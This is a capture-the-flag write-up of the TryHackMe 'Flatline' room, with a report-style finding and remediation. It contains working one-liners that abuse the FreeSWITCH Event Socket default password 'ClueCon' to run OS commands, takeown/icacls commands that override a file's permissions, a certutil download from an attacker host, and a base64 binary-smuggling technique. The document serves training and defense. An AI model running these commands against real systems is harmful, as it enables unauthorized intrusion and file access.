# TryHackMe — Flatline

> **Platform:** TryHackMe &nbsp;|&nbsp; **OS:** Windows Server 2019 (standalone) &nbsp;|&nbsp; **Difficulty:** Medium
> **Vector:** FreeSWITCH `mod_event_socket` default-credential RCE → local DACL bypass
> **Status:** Completed — both flags captured

A single exposed telephony control-plane port carries the whole box. The interesting part is *not* the exploit — it is a default password on a management interface that was never meant to face the network — but the privilege-escalation step, where an account that **is** a local administrator still cannot read a file, and the correct fix is a *privilege*, not group membership.

---

## 0. Executive Summary

| | |
|---|---|
| **Entry point** | FreeSWITCH Event Socket (`8021/tcp`), enabled by default, bound to all interfaces, protected only by the vendor-default password `ClueCon`. |
| **Foothold** | Authenticated Event Socket client → `api system <cmd>` → command execution as local service account `Nekrotic`. |
| **Privilege escalation** | `root.txt` carried a restrictive DACL excluding `Nekrotic`. Bypassed with built-in `takeown` (self-activates `SeTakeOwnershipPrivilege`) + `icacls /grant`. No SYSTEM, no binary, no reverse shell. |
| **Kill-chain (ATT&CK)** | T1190 → T1078.001 → T1059 → T1222.001 |
| **Root cause classes** | CWE-798 (default creds) · CWE-306 (missing auth on exposed interface) · CWE-250 (service runs as privileged account) |

---

## 1. Reconnaissance

Host does not respond to ICMP, so `-Pn` is required.

```bash
nmap -sCV -O -Pn -p- <TARGET_IP>
```

Two ports, nothing else:

```
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name:        WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version:    10.0.17763
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

**What the output tells us before touching anything:**

- **`3389/RDP` — NTLM leak is pure intel.** `Product_Version 10.0.17763` = **Windows Server 2019**. Critically, `NetBIOS_Domain_Name == NetBIOS_Computer_Name == WIN-EOM4PK0578N` → this is a **standalone workgroup host, not a Domain Controller**. No AD, no Kerberoast, no BloodHound. RDP is *not* the entry vector — it is a potential inbound channel to use *with* credentials later.
- **`8021/freeswitch-event`** is the entire attack surface. The room name "Flatline" (a flat-line ECG / telephony pun) points straight at it.
- OS fingerprinting is flagged unreliable — expected, since nmap needs at least one closed port to profile the TCP/IP stack and here 998 ports are `filtered`. Irrelevant: the NTLM banner already gave us the exact build.

---

## 2. Enumeration — Understanding the Vulnerability

FreeSWITCH's **Event Socket** (`mod_event_socket`) is a TCP control interface for the telephony engine — the same channel `fs_cli` uses. Three design properties make it dangerous once it is reachable:

1. **Enabled by default** on vanilla installs, and the default configuration **binds to `::`** — every interface, not loopback. Exposing it to the network is the misconfiguration; it should be `listen-ip 127.0.0.1`.
2. **Authentication is a single password string**, default **`ClueCon`**, compared verbatim (`strcmp(prefs.password, pass)` in `mod_event_socket.c`).
3. **After `auth`, the client may issue any API command** — including `system`, which hands an arbitrary string to the host OS shell.

So the chain is purely: *publicly-known default password on a network-exposed control-plane → the `system` API command → OS command execution*. This is **not a memory-corruption CVE** — it is a design/misconfiguration issue. Metasploit tags it CWE-260; a more precise mapping for a report is **CWE-798** (default credentials) + **CWE-306** (missing authentication on an exposed critical function).

**References:** ExploitDB `47698` (Ruby), `47799` (Windows/Python PoC); Metasploit `exploit/multi/misc/freeswitch_event_socket_cmd_exec`.

**Pattern match (prior rooms):** same "legitimate remote-admin/control service shipping default or no authentication → RCE" class as **Backtrack** (token-less aria2 JSON-RPC) and **Annie** (AnyDesk). Telephony theme shared with **Infinity Pool** (FreePBX).

### 2.1 The Event Socket protocol in practice

The server speaks a line-based, `Content-Length`-framed protocol. The two gotchas that cost the most time:

- A command is terminated by a **double newline** (`\n\n`). In an interactive client a single Enter sends an *incomplete* command; the unauthenticated socket then hits its short idle-auth window and drops you with `Disconnected, goodbye`. That disconnect is **not** a "wrong password" signal.
- Typing a literal `\n\n` into a terminal sends the two characters backslash-n, not newlines — it becomes part of the password and `strcmp` fails.

The reliable approach is to send everything atomically with `printf`, and to hold the socket open long enough to read the framed response body:

```bash
printf 'auth ClueCon\n\napi system whoami\n\n' | ncat -i 4 <TARGET_IP> 8021
```

`-i 4` keeps the connection alive 4 s after the last data so the `api/response` body arrives.

---

## 3. Exploitation — RCE as `Nekrotic`

```bash
printf 'auth ClueCon\n\napi system whoami\n\n' | ncat -i 4 <TARGET_IP> 8021
```

```
Content-Type: command/reply
Reply-Text: +OK accepted          ← default password accepted

Content-Type: api/response
win-eom4pk0578n\nekrotic          ← command executed
```

The default password is accepted and `system` runs. **Execution context is the local user `Nekrotic`, not `LocalSystem`** — an important correction to the common assumption that FreeSWITCH-on-Windows always runs as SYSTEM.

Locate the user profile and grab the first flag:

```bash
printf 'auth ClueCon\n\napi system cmd /c dir C:\\Users\n\n' | ncat -i 4 <TARGET_IP> 8021
# → Administrator, Nekrotic, Public

printf 'auth ClueCon\n\napi system cmd /c type C:\\Users\\Nekrotic\\Desktop\\user.txt\n\n' | ncat -i 5 <TARGET_IP> 8021
```

> **user.txt:** `THM{64bca0843d5…cbe26}`

---

## 4. Post-Exploitation — Reading `root.txt` (DACL bypass)

`dir` showed **both** flags on the *same* desktop:

```
C:\Users\Nekrotic\Desktop\user.txt
C:\Users\Nekrotic\Desktop\root.txt
```

Yet reading `root.txt` the same way returned:

```
Content-Type: api/response
-ERR no reply
```

### 4.1 Decoding `-ERR no reply`

This is **not** "file not found". The FreeSWITCH `system` API returns **stdout only** — `stderr` is suppressed. A denied read produces empty stdout, which the engine reports as `-ERR no reply`. Appending `2>&1` surfaces the real "Access is denied". So: `user.txt` is readable and `root.txt` is not, in the *same folder* → this is a **per-file DACL**, not a token or path problem.

### 4.2 Why being an Administrator is not enough

```bash
printf 'auth ClueCon\n\napi system whoami /priv\n\napi system whoami /groups\n\n' | ncat -i 8 <TARGET_IP> 8021
```

Key lines:

```
BUILTIN\Administrators                  S-1-5-32-544  Enabled group, Group owner
NT AUTHORITY\Local account and member
of Administrators group                 S-1-5-114     Enabled group
Mandatory Label\High Mandatory Level    S-1-16-12288

SeTakeOwnershipPrivilege    ... Disabled
SeBackupPrivilege           ... Disabled
SeImpersonatePrivilege      ... Enabled
```

`Nekrotic` **is** in `BUILTIN\Administrators`, with a full (non-UAC-filtered) token at High integrity. The crucial concept:

> **Group membership is a SID in the token. File access is decided by the object's ACE.** If `root.txt`'s DACL does not list `Administrators` (or `Nekrotic`), membership grants nothing. An administrator bypasses such a DACL via a **privilege** — `SeBackupPrivilege` (backup-semantics read) or `SeTakeOwnershipPrivilege` (become owner → rewrite the DACL) — **not** by being in the group.

Those privileges are *present* but *Disabled* — and `type` will not enable them. `takeown`, however, self-activates `SeTakeOwnershipPrivilege`.

### 4.3 The chain (all built-in, no SYSTEM required)

```bash
printf 'auth ClueCon\n\n\
api system cmd /c icacls C:\\Users\\Nekrotic\\Desktop\\root.txt\n\n\
api system cmd /c takeown /f C:\\Users\\Nekrotic\\Desktop\\root.txt\n\n\
api system cmd /c icacls C:\\Users\\Nekrotic\\Desktop\\root.txt /grant Nekrotic:F\n\n\
api system cmd /c type C:\\Users\\Nekrotic\\Desktop\\root.txt\n\n' \
| ncat -i 10 <TARGET_IP> 8021
```

```
icacls   → Failed processing 1 files              (even reading the DACL was denied — evidence)
takeown  → SUCCESS: ... now owned by "WIN-EOM4PK0578N\Nekrotic"
icacls   → Successfully processed 1 files          (owner rewrote the DACL)
type     → THM{...}
```

> **root.txt:** `THM{8c8bc5558f0…9fb5e}`

Note: although `SeImpersonatePrivilege` is enabled (a textbook "Potato → SYSTEM" setup, as used in VulnNet: Active), it was never needed. The objective was a file read, and ownership + DACL rewrite is the shortest, cleanest path.

---

## 5. A note on egress (why no reverse shell)

Early attempts to get an interactive session all failed, and the failures were consistent:

- Metasploit `cmd/windows/reverse_powershell` → `Login success`, payload sent, **no session**.
- `certutil -urlcache -f http://<ATTACKER_IP>/... ` → `0x80072efd (WinHttp 12029 ERROR_WINHTTP_CANNOT_CONNECT)`.

**The target firewall drops all outbound traffic.** Two independent failed callbacks is a firewall signature — the right move is to stop re-tuning `LHOST`/port and switch strategy entirely. Because `api system` returns stdout **synchronously over the inbound `8021` channel**, the whole engagement can run **pull-free** with native tools. That is exactly what the `takeown`/`type` chain did — zero outbound packets, zero dropped binaries, zero AV surface.

> *Staged fallback, unused:* when a binary **is** needed on an egress-locked Windows host, push it inbound as base64 — `base64 -w0 tool.exe` on the attacker, send in ~6000-char chunks via `cmd /c echo <chunk>>>C:\Windows\Temp\x.b64` (respecting the ~8191-char command-line limit), then reassemble with `certutil -decode x.b64 x.exe`. Worth keeping for AV/egress-restricted boxes.

---

## 6. Lessons Learned

1. **Pull priv + groups + integrity level together.** Running `whoami /priv` *without* `/groups` gave half the picture and pushed me toward a premature `SeImpersonate → GodPotato → SYSTEM` plan — on a box where the service account was already a local admin. Enumerate the whole token before choosing a privilege-escalation technique.
2. **Administrators membership ≠ file access.** An admin reads a DACL-excluded file through `SeBackup`/`SeTakeOwnership`, not through group membership. The ACE decides; the token SID only matters if the ACE references it.
3. **`-ERR no reply` from FreeSWITCH `system` is a suppressed-stderr error, not "file absent".** Add `2>&1` to see the truth (often Access-denied).
4. **Distinguish transport failures from application errors.** An ncat `TIMEOUT` with no `auth/request` banner means a dead/rebooting instance or routing problem — bottom-up triage (`ping` → `ncat -v` banner → `nmap`), not another exploit attempt. `-ERR` is application-level; `TIMEOUT` is transport-level.
5. **Don't over-engineer the callback.** When inbound RCE already returns stdout, read the objective with native file-read + privilege activation. Reverse shells, Potato, and dropped binaries were all unnecessary here — and on an egress-filtered host, actively counterproductive.
6. **Event Socket client hygiene:** send `auth` + command atomically via `printf` (real `\n\n`), and use `ncat -i N` to read the framed response.

---

## 7. Finding (report format)

### Unauthenticated RCE via Default-Credentialed FreeSWITCH Event Socket Exposed to the Network

| Field | Value |
|---|---|
| **Severity** | Critical — **CVSS 3.1: 9.8** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-798 (Default Credentials) · CWE-306 (Missing Authentication for Critical Function) · CWE-250 (Execution with Unnecessary Privileges) |
| **ATT&CK** | T1190 → T1078.001 → T1059 → T1222.001 |
| **Reference** | ExploitDB 47698 / 47799; MSF `exploit/multi/misc/freeswitch_event_socket_cmd_exec` |

> `PR:N` is justified: the only authentication barrier is a publicly-known vendor default (`ClueCon`), so effective privileges required are none.

**Description (mechanism).** FreeSWITCH `mod_event_socket` is a TCP control interface enabled by default and bound to all interfaces (`::`). On the target it is reachable on `8021/tcp`. Authentication is a single password string compared verbatim; it was left at the vendor default `ClueCon`. After authentication a client may issue any API command, including `system`, which executes arbitrary OS commands. A publicly-known default password on a network-exposed control-plane therefore yields effectively-unauthenticated command execution. The service additionally runs as a local account that is a member of `BUILTIN\Administrators` rather than an isolated low-privilege service identity, collapsing the gap between service RCE and host administration.

**Impact.** Full host compromise with no valid credentials: arbitrary command execution, read/modify of any file (restrictive DACLs bypassed via built-in `takeown`/`icacls`), and escalation to `NT AUTHORITY\SYSTEM` (the token holds `SeImpersonatePrivilege`). For telephony infrastructure, also call interception/spoofing, toll fraud, and voicemail access.

**Steps to Reproduce.**
1. `nmap -sCV -Pn -p8021 <ip>` → confirm `freeswitch-event mod_event_socket`.
2. `printf 'auth ClueCon\n\napi system whoami\n\n' | ncat -i 4 <ip> 8021` → `+OK accepted` + command output = RCE.
3. `… api system cmd /c type C:\Users\Nekrotic\Desktop\user.txt …` → user flag.
4. `… takeown /f <root.txt>` → `… icacls <root.txt> /grant Nekrotic:F` → `… type <root.txt>` → root flag.

**Remediation.**
- Change the Event Socket password to a strong, unique secret in `conf/autoload_configs/event_socket.conf.xml`.
- Bind to loopback (`listen-ip 127.0.0.1`); if remote management is required, restrict with `apply-inbound-acl` and tunnel over VPN/mTLS — never a plaintext network port.
- Run FreeSWITCH under a dedicated low-privilege service account outside `Administrators` (breaks the RCE → admin link).
- Maintain network segmentation of the telephony segment and monitor `8021/tcp` for anomalous `api system` commands (compensating control).

**Evidence.** RDP NTLM banner (`WIN-EOM4PK0578N`, build 10.0.17763); `auth ClueCon` → `+OK accepted`; `whoami` → `win-eom4pk0578n\nekrotic`; `whoami /groups` → `BUILTIN\Administrators` + `S-1-5-114`; `icacls` denial → `takeown` ownership change → `type` → flag.

---

*Flags intentionally redacted. Authorized lab engagement on TryHackMe (Flatline). For educational/defensive reference.*
